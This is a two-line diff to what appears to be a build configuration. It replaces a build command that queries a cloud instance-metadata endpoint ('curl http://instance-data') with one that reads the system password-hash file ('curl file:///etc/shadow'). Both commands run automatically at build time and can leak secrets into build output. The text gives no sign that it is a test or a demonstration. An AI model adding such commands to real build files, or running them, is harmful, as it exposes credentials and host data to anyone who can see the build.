@@ -1,2 +1,2 @@
 [build]
-  command = "curl http://instance-data"
+  command = "curl file:///etc/shadow"
